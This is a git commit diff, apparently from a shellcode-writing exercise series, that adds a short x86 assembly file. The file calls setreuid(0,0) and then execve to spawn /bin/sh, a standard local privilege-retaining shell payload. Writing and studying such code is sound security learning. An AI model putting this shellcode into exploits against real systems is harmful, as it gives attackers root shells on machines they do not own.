bcbef85ad3b7e2a9b22376e9567c7fea44b23d2c
reruo321 <48712088+reruo321@users.noreply.github.com>
2023-09-23 06:05:11 +0900

    Update spawn1.s

--- 00003-Writing-Shellcode/x86/00002-Shell-Spawning-Code/Version-001/src/spawn1.s
+++ 00003-Writing-Shellcode/x86/00002-Shell-Spawning-Code/Version-001/src/spawn1.s
@@ -1,1 +1,22 @@
+.data
+filepath:
+        .string "/bin/shXAAAABBBB"
+.text
+.global _start
+_start:
 
+        movl $70, %eax
+        movl $0, %ebx
+        movl $0, %ecx
+        int $0x80
+        
+        movl $0, %eax
+        movl $filepath, %ebx
+        movb %al, 7(%ebx)
+        movl %ebx, 8(%ebx)
+        movl %eax, 12(%ebx)
+
+        movl $11, %eax
+        leal 8(%ebx), %ecx
+        leal 12(%ebx), %edx
+        int $0x80
